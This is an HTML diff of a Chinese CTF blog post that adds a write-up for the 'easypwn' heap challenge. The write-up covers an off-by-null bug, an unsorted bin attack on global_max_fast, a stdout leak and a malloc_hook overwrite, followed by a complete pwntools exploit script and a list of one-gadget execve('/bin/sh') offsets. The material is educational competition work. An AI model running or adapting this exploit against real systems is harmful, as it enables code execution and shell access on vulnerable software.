@@ -121,7 +121,7 @@
                   
                   &nbsp;<i class="far fa-chart-bar"></i>
                   <span class="post-count">
-                    2.6k 字
+                    3.2k 字
                   </span>&nbsp;
                 
 
@@ -129,7 +129,7 @@
                   
                   &nbsp;<i class="far fa-clock"></i>
                   <span class="post-count">
-                      13 分钟
+                      17 分钟
                   </span>&nbsp;
                 
 
@@ -549,6 +549,150 @@ edit(8,p64(one_rec))
 add()
 itr()</code></pre>
 <p>还是挺简单的，比赛时竟然没有看这个题。</p>
+<h2 id="easypwn"><a href="#easypwn" class="headerlink" title="easypwn"></a>easypwn</h2><h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><pre><code class="c">if ( !mallopt(1, 0) )
+    exit(-1);</code></pre>
+<ul>
+<li><p>禁用了fastbin，原理就是修改<code>global_max_fast</code> = 0x10</p>
+</li>
+<li><p>存在off by null</p>
+</li>
+<li><p>没有show功能</p>
+<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3></li>
+<li><p>利用off by null ，修改unsorted bin 的bk为<code>global_max_fast - 0x10</code></p>
+</li>
+<li><p>利用unsorted bin 攻击 <code>global_max_fast</code></p>
+</li>
+<li><p>接着fastbin attack 打io file的stdout，泄漏libc</p>
+</li>
+<li><p>接着fastbin attack打 <code>malloc_hook</code> 为one gadget</p>
+</li>
+</ul>
+<h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *
+import time
+local_file  = &#39;./easypwn&#39;
+elf = ELF(local_file)
+context.log_level = &#39;debug&#39;
+debug = 1
+if debug:
+    io = process(local_file)
+    libc = elf.libc
+else:
+    io = remote(&#39;39.101.184.181&#39;,10000)
+    libc = elf.libc
+    # libc = ELF(&#39;./libc-easypwn.so&#39;)
+context.arch = elf.arch
+context.terminal = [&#39;tmux&#39;,&#39;neww&#39;]
+#,&#39;&#39;splitw&#39;,&#39;-h&#39;
+s      = lambda data               :io.send(data) 
+sa      = lambda delim,data         :io.sendafter(delim, data)
+sl      = lambda data               :io.sendline(data)
+sla     = lambda delim,data         :io.sendlineafter(delim, data)
+r      = lambda numb=4096          :io.recv(numb)
+ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
+uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))
+uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))
+info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))
+itr     = lambda                    :io.interactive()
+def debug():
+    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)
+    gdb.attach(io)
+    pause()
+
+def add(size):
+    sla(&#39;choice&#39;,&#39;1&#39;)
+    sla(&#39;size&#39;,str(size))
+
+def edit(idx,data):
+    sla(&#39;choice&#39;,&#39;2&#39;)
+    sla(&#39;idx&#39;,str(idx))
+    sa(&#39;tent&#39;,str(data))
+
+def delete(idx):
+    sla(&#39;ice&#39;,&#39;3&#39;)
+    sla(&#39;idx&#39;,str(idx))
+
+def leak_addr():
+    add(0x30) #0
+    add(0x98) #1
+    add(0xf0) #2
+    add(0x98) #3
+    add(0x40)
+    delete(0)
+    #null off by one
+    edit(1,&#39;d&#39;*0x90 + p64(0xa0 + 0x40))
+    delete(2)
+    add(0xe8 - 0x30)
+    add(0xe8)
+    add(0x20)
+    delete(2)
+    payload = p64(0) * 7 * 2 + p64(0) + p64(0xf1) +p64(0)+ p16(0x57f8- 0x10) + &#39;\n&#39;
+    edit(1,payload)
+    add(0xe8)
+
+    delete(2)
+    payload = p64(0) * 7 * 2 + p64(0) + p64(0xf1) + p16(0x45cf) + &#39;\n&#39;
+    edit(1,payload)
+    add(0xe8)
+    add(0xe8)
+    edit(6, &#39;b&#39; * 0x41 + p64(0xfbad3c80) + p64(0) * 3 + p8(0) + &#39;\n&#39;)
+
+leak = 0
+while True:
+    try:
+        leak_addr()
+        ss = io.recvuntil(chr(0x7f),timeout = 0.5)
+        if len(ss) == 0:
+            raise Exception(&#39;&#39;)
+        io.recv(10)
+        leak = uu64(r(6))
+        if leak == 0x7ff81b57b6a3:
+            raise Exception(&#39;&#39;)
+        break
+    except Exception:
+        io.close()
+        io = process(&#39;./easypwn&#39;)
+        # io = remote(&#39;39.101.184.181&#39;,10000)
+        continue
+
+info_addr(&#39;leak&#39;,leak)
+libc_addr = leak - 0x3c56a3
+info_addr(&#39;libc_base&#39;,libc_addr)
+
+delete(2)
+edit(1, p64(0) * 7 * 2 + p64(0) + p64(0xf1) + p64(libc_addr + libc.symbols[&#39;_IO_2_1_stdin_&#39;] + 143) + &#39;\n&#39;)
+add(0xe8)
+add(0xe8)
+edit(7,&#39;\0&#39; * 0xe1 + p32(0xf1) + &#39;\n&#39;)
+delete(2)
+edit(1, p64(0) * 7 * 2 + p64(0) + p64(0xf1) + p64(libc_addr + libc.symbols[&#39;_IO_2_1_stdin_&#39;] + 376) + &#39;\n&#39;)
+add(0xe8)
+add(0xe8)
+
+
+rec = libc_addr + 0xf0364
+# realloc = libc_addr + libc.symbols[&#39;realloc&#39;] + realloc[1]
+payload = &#39;\x00&#39; * 0xa0 + p64(rec) + p64(rec) + &#39;\n&#39;
+
+edit(8, payload)
+info_addr(&#39;libc_base&#39;,libc_addr)
+add(0xe8)
+itr()
+
+# 0x45226 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)
+# constraints:
+#   rax == NULL
+
+# 0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)
+# constraints:
+#   [rsp+0x30] == NULL
+
+# 0xf0364 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)
+# constraints:
+#   [rsp+0x50] == NULL
+
+# 0xf1207 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)
+# constraints:
+#   [rsp+0x70] == NULL</code></pre>
 
             <hr>
           </div>
